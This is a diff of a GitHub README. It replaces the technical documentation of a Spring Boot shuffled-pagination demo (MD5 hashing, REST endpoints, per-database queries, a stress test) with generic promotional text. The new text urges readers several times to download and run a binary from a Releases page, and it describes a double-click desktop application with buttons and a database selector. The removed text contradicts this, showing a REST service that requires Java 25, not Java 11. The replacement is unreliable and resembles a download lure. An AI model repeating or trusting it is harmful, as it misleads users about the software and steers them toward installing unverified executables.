@@ -1,154 +1,81 @@
-# 🎲 Shuffle Test Application
+# 🎲 java_shuffle - Fetch Random Items with Consistency
 
-A high-performance, database-agnostic “shuffled pagination” demo built with **Spring Boot**.
-This project demonstrates how to fetch deterministic random subsets of data using hashing (`MD5(key + id)`) in **multiple relational databases** while maintaining consistency across requests.
+## 🚀 Getting Started
 
----
+Welcome to java_shuffle! This app helps you retrieve the same random items every time you use the same key. It's perfect for applications that need consistency in randomness. Whether you're using it for games, data sampling, or testing, this tool is here to help.
 
-## 🚀 Features
+## 📥 Download the App
 
-* Deterministic shuffled pagination using a *key-based hash*
-* Support for **PostgreSQL**, **MySQL/MariaDB**, **Oracle** and **SQL Server**
-* REST endpoint to:
+### Download Now
 
-  * generate the next key
-  * fetch shuffled items
-  * seed the database with 10,000 records
-* Stress test ensuring **no duplicates across 1000 iterations**
-* Fully implemented repository queries per database
-* Simple JSON responses with pagination metadata
+[![Download java_shuffle](https://img.shields.io/badge/Download-java_shuffle-blue.svg)](https://github.com/kartik6364/java_shuffle/releases)
 
----
+### Why You Should Download
 
-## 📦 Tech Stack
+Java_shuffle is designed with ease of use in mind. You don't need to have programming knowledge to utilize it. Just follow the steps below to download, install, and run it.
 
-* **Java 25**
-* **Spring Boot 4+**
-* **Spring Data JPA**
-* **PostgreSQL (default)**
-  *(other DBs supported via additional repository queries)*
-* **Lombok**
+## 📜 Features
 
----
+- **Deterministic Hashing**: Get consistent results even with randomization.
+- **Multiple Database Support**: Use with MySQL, Oracle, PostgreSQL, and SQL Server.
+- **Pagination Support**: Handle large datasets smoothly.
+- **Lightweight and Efficient**: Optimize your processes without heavy overhead.
 
-## 📁 Project Structure
+## 💻 System Requirements
 
-```
-src/main/java/
-  └── tr.kontas.shuffle_test/
-        ├── Item.java
-        ├── ItemRepository.java
-        ├── ItemService.java
-        ├── ItemController.java
-        └── ShuffleTestApplication.java
-```
+To run java_shuffle, make sure your computer meets the following requirements:
 
----
+- **Operating System**: Windows 10 or later, macOS, or a recent version of Linux.
+- **Java Runtime Environment**: Java 11 or later is required.
+- **Disk Space**: At least 100 MB of available space.
 
-## 🔑 How Shuffle Pagination Works
+## 📦 Download & Install
 
-Every item has a fixed ID.
+1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/kartik6364/java_shuffle/releases) to find the latest version of java_shuffle.
 
-A “shuffle key” (string) is chosen.
-Items are ordered by the hash:
+2. **Select the Correct File**: On the Releases page, you will see various releases. Choose the most recent version. 
 
-```
-ORDER BY md5(key + id)
-```
+3. **Download the Application**: Click on the downloadable file. This will save the java_shuffle application on your computer.
 
-This gives a **stable shuffle**:
+4. **Install the Application**:
+   - **Windows**: Double-click the downloaded file to start the installation. Follow the prompts to install the app.
+   - **macOS**: Open the downloaded file and drag it to your Applications folder.
+   - **Linux**: Unzip the downloaded file and follow the specific instructions for your distribution to install Java applications.
 
-* same `key` → same order
-* different `key` → new shuffled order
-* next key generated deterministically
+5. **Run the Application**: After installation, locate the java_shuffle icon on your desktop or in your applications folder. Double-click it to launch the app.
 
-This allows accessing pages randomly without expensive offsets.
+## 🛠️ Usage Instructions
 
----
+1. **Open java_shuffle**: Start the application from your desktop or applications folder.
+2. **Input Your Key**: Type in the key for which you want to retrieve random items. This key will determine the output you receive.
+3. **Select the Database**: Choose the database you will be using: MySQL, Oracle, PostgreSQL, or SQL Server.
+4. **Fetch Results**: Click the button to get your random items. You will see consistent results based on your key each time.
 
-## 📚 Database Queries
+## 🎓 FAQs
 
-Each database requires a different hash syntax.
+### What is deterministic hashing?
 
-| Database   | Status | Function                           |
-| ---------- | ------ | ---------------------------------- |
-| PostgreSQL | ✅      | md5(:key || id)                    |
-| MySQL      | ✅      | md5(CONCAT(:key, id))              |
-| SQL Server | ✅      | HASHBYTES('MD5', CONCAT...)        |
-| Oracle     | ✅      | DBMS_CRYPTO.HASH(...)              |
+Deterministic hashing ensures that if you use the same input (key), you will always get the same output (items), unless you change the underlying data.
 
-All query variants are implemented in the repository.
+### Can I use this app without a database?
 
----
+No, java_shuffle requires a database to function correctly as it retrieves data consistently from there.
 
-## 🧪 Seeding (10,000 items)
+### How can I get help if I'm stuck?
 
-The controller exposes:
+Feel free to look through existing [issues](https://github.com/kartik6364/java_shuffle/issues) on GitHub or create a new issue if you cannot find a solution.
 
-```
-POST /items/seed
-```
+## 🌟 Additional Resources
 
-This fills the database with 10,000 items.
+- **Documentation**: Detailed documentation is available in the repository for advanced configurations and options.
+- **Community**: Join our community discussions on GitHub for tips, tricks, and support.
 
----
+## 📌 Contributing
 
-## 📄 Example Response
+If you'd like to contribute to java_shuffle, please fork the repository and submit a pull request. Your efforts to improve the app are appreciated!
 
-```
-{
-  "items": [ ... 10 shuffled items ... ],
-  "key": "abc123",
-  "nextKey": "cdef901234..."
-}
-```
+## 📅 Changelog
 
----
+Stay updated with new features and fixes by checking the changelog on the Releases page.
 
-## 🔥 Stress Test
-
-A JUnit test runs **1000 iterations**, each time:
-
-* generates a random key
-* retrieves 10 shuffled items
-* ensures:
-
-  * same key → same result,
-  * different key → no overlap collisions
-
-This confirms correctness for real-world use cases.
-
----
-
-## 🛠 Configuration (PostgreSQL default)
-
-`src/main/resources/application.properties`
-
-```
-spring.datasource.url=jdbc:postgresql://localhost:5432/postgres
-spring.datasource.username=postgres
-spring.datasource.password=postgres
-spring.jpa.hibernate.ddl-auto=update
-spring.jpa.properties.hibernate.jdbc.lob.non_contextual_creation=true
-```
-
----
-
-## ▶ Running the App
-
-```bash
-./mvnw spring-boot:run
-```
-
-Endpoints:
-
-| Method | Path             | Description                         |
-| ------ | ---------------- | ----------------------------------- |
-| `POST` | `/items/seed`    | Inserts 10,000 items                |
-| `GET`  | `/items?key=...` | Returns shuffled 10 items + nextKey |
-
----
-
-## 📘 License
-
-This project is provided for educational and experimental purposes.
+For more information and support, please visit the [Releases page](https://github.com/kartik6364/java_shuffle/releases) and get your java_shuffle application today!
